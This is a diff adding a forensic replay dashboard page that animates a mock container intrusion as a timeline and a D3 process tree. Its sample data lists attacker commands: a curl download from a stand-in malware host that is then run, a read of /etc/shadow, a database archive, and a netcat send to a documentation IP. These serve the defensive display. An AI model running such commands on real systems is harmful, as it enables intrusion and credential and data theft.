@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FTM | Forensic Replay Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://d3js.org/d3.v7.min.js"></script>
+    <style>
+        body { background-color: #0f172a; color: #f8fafc; overflow: hidden; }
+        .node circle { fill: #3b82f6; stroke: #60a5fa; stroke-width: 2px; }
+        .node.malicious circle { fill: #ef4444; stroke: #f87171; animation: pulse 1s infinite; }
+        .node text { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 13px; fill: #cbd5e1; pointer-events: none; }
+        .node.malicious text { fill: #fca5a5; font-weight: bold; }
+        .link { fill: none; stroke: #334155; stroke-width: 2px; }
+        
+        @keyframes pulse {
+            0% { filter: drop-shadow(0 0 0px #ef4444); transform: scale(1); }
+            50% { filter: drop-shadow(0 0 12px #ef4444); transform: scale(1.3); }
+            100% { filter: drop-shadow(0 0 0px #ef4444); transform: scale(1); }
+        }
+
+        /* Custom scrollbar for timeline */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #0f172a; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #475569; }
+    </style>
+</head>
+<body class="h-screen flex flex-col font-sans">
+    
+    <!-- Top Nav -->
+    <header class="bg-slate-900 border-b border-slate-800 p-4 flex justify-between items-center z-10 shadow-lg">
+        <div>
+            <h1 class="text-2xl font-bold text-blue-400 flex items-center tracking-wide">
+                <svg class="w-7 h-7 mr-3 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                FORENSIC TIME MACHINE
+            </h1>
+            <p class="text-slate-400 text-xs mt-1 ml-10 font-mono">Incident ID: INC-29481 | Status: <span class="text-red-400">Pod Terminated (Poof)</span></p>
+        </div>
+        <div class="bg-slate-800 border border-slate-700 px-4 py-2 rounded-md font-mono text-xs text-slate-300">
+            Evidence Hash (SHA-256): <span class="text-emerald-400 font-bold ml-1">e3b0c44298fc1c149afbf4c8996fb...</span>
+        </div>
+    </header>
+
+    <main class="flex-1 flex h-full relative">
+        
+        <!-- Left Sidebar: Event Timeline -->
+        <aside class="w-[350px] bg-slate-900/90 border-r border-slate-800 flex flex-col h-full shadow-2xl z-10">
+            <div class="p-4 border-b border-slate-800 bg-slate-900 sticky top-0 flex justify-between items-center">
+                <h2 class="text-sm font-bold text-slate-300 tracking-widest uppercase">Kernel Syscall Timeline</h2>
+                <div class="h-2 w-2 bg-green-500 rounded-full animate-pulse"></div>
+            </div>
+            
+            <!-- Timeline Stream -->
+            <div id="timeline" class="flex-1 overflow-y-auto p-4 space-y-3 pb-20">
+                <!-- Javascript will inject events here -->
+            </div>
+        </aside>
+
+        <!-- Right Side: D3.js Graph Visualization -->
+        <section class="flex-1 bg-slate-950 relative overflow-hidden" id="graph-container">
+            
+            <!-- Background Grid Lines -->
+            <div class="absolute inset-0 z-0" style="background-image: radial-gradient(#1e293b 1px, transparent 1px); background-size: 30px 30px; opacity: 0.3;"></div>
+
+            <!-- Graph Legend -->
+            <div class="absolute top-6 right-6 bg-slate-900/80 p-4 rounded-xl border border-slate-700 backdrop-blur-md z-10 shadow-xl">
+                <h3 class="text-xs font-bold text-slate-400 mb-3 uppercase tracking-wider">Process Legend</h3>
+                <div class="flex items-center text-sm text-slate-300 mb-2">
+                    <span class="w-3 h-3 rounded-full bg-blue-500 shadow-[0_0_8px_rgba(59,130,246,0.6)] mr-3"></span> Expected Behavior
+                </div>
+                <div class="flex items-center text-sm text-slate-300">
+                    <span class="w-3 h-3 rounded-full bg-red-500 shadow-[0_0_8px_rgba(239,68,68,0.8)] mr-3 animate-pulse"></span> Malicious Drift
+                </div>
+            </div>
+            
+        </section>
+    </main>
+
+    <script>
+        // Phase 4/5: Replay Mock Data (Simulating TimescaleDB & Neo4j output)
+        const forensicData = [
+            { id: "1", parent: null, command: "nginx: master", timestamp: "12:00:01.120", malicious: false },
+            { id: "2", parent: "1", command: "nginx: worker", timestamp: "12:00:01.340", malicious: false },
+            { id: "3", parent: "1", command: "nginx: worker", timestamp: "12:00:01.345", malicious: false },
+            { id: "4", parent: "2", command: "bash", timestamp: "12:45:10.001", malicious: true, details: "Remote shell execution via vulnerability" },
+            { id: "5", parent: "4", command: "curl -s http://malware.io/x", timestamp: "12:45:11.450", malicious: true },
+            { id: "6", parent: "4", command: "chmod +x x", timestamp: "12:45:12.100", malicious: true },
+            { id: "7", parent: "4", command: "./x", timestamp: "12:45:13.200", malicious: true, details: "Executing unverified binary" },
+            { id: "8", parent: "7", command: "cat /etc/shadow", timestamp: "12:45:14.050", malicious: true, details: "Attempted credential theft" },
+            { id: "9", parent: "7", command: "tar -czf data.tar /app/db", timestamp: "12:45:15.500", malicious: true },
+            { id: "10", parent: "7", command: "nc 198.51.100.4 4444", timestamp: "12:45:18.000", malicious: true, details: "Exfiltrating data over netcat" }
+        ];
+
+        const timelineEl = document.getElementById('timeline');
+        const container = document.getElementById('graph-container');
+        const width = container.clientWidth;
+        const height = container.clientHeight;
+        
+        // Initialize D3
+        const svg = d3.select("#graph-container").append("svg")
+            .attr("width", width)
+            .attr("height", height)
+            .style("position", "relative")
+            .style("z-index", "1");
+
+        const g = svg.append("g").attr("transform", `translate(150, ${height/2})`);
+        const treeLayout = d3.tree().size([height - 200, width - 400]);
+
+        // Playback logic
+        let currentIdx = 0;
+        
+        function tick() {
+            if (currentIdx >= forensicData.length) return;
+            
+            const event = forensicData[currentIdx];
+            
+            // 1. Add to Timeline
+            const el = document.createElement('div');
+            el.className = `p-3 rounded-lg border shadow-sm transition-all duration-300 transform translate-y-4 opacity-0 ${event.malicious ? 'bg-red-950/40 border-red-800/60' : 'bg-slate-800/40 border-slate-700/60'}`;
+            el.innerHTML = `
+                <div class="flex justify-between items-center mb-1">
+                    <span class="text-xs font-mono ${event.malicious ? 'text-red-400' : 'text-slate-400'}">${event.timestamp}</span>
+                    ${event.malicious ? '<span class="px-1.5 py-0.5 rounded text-[10px] bg-red-900/50 text-red-300 border border-red-800 uppercase tracking-wide">Alert</span>' : ''}
+                </div>
+                <div class="font-mono text-[13px] ${event.malicious ? 'text-red-300' : 'text-blue-300'}">${event.command}</div>
+                ${event.details ? `<div class="text-[11px] text-slate-400 mt-2 border-t border-slate-700/50 pt-2">${event.details}</div>` : ''}
+            `;
+            timelineEl.appendChild(el);
+            
+            // Trigger animation
+            setTimeout(() => {
+                el.classList.remove('translate-y-4', 'opacity-0');
+            }, 50);
+
+            // Auto-scroll timeline
+            timelineEl.scrollTop = timelineEl.scrollHeight;
+
+            // 2. Update Graph
+            updateGraph(forensicData.slice(0, currentIdx + 1));
+            
+            currentIdx++;
+            
+            // Variable timing: Fast for normal stuff, slower for malicious to build suspense
+            const delay = event.malicious ? 1500 : 800;
+            setTimeout(tick, delay);
+        }
+
+        function updateGraph(data) {
+            const stratify = d3.stratify().id(d => d.id).parentId(d => d.parent);
+            const root = stratify(data);
+            treeLayout(root);
+
+            // Links
+            const link = g.selectAll(".link").data(root.links(), d => d.target.id);
+            link.enter()
+                .append("path")
+                .attr("class", "link")
+                .attr("d", d3.linkHorizontal().x(d => d.y).y(d => d.x))
+                .style("opacity", 0)
+                .transition().duration(600)
+                .style("opacity", 1);
+
+            // Nodes
+            const node = g.selectAll(".node").data(root.descendants(), d => d.id);
+            const nodeEnter = node.enter()
+                .append("g")
+                .attr("class", d => `node ${d.data.malicious ? 'malicious' : ''}`)
+                .attr("transform", d => `translate(${d.y},${d.x})`)
+                .style("opacity", 0)
+                .style("transform", "scale(0.5)");
+
+            nodeEnter.append("circle").attr("r", 8);
+
+            nodeEnter.append("text")
+                .attr("dy", "-16")
+                .attr("x", 0)
+                .attr("text-anchor", "middle")
+                .text(d => d.data.command);
+
+            nodeEnter.transition().duration(600).style("opacity", 1).style("transform", "scale(1)");
+        }
+
+        // Start the forensic replay after 1 second
+        setTimeout(tick, 1000);
+    </script>
+</body>
+</html>
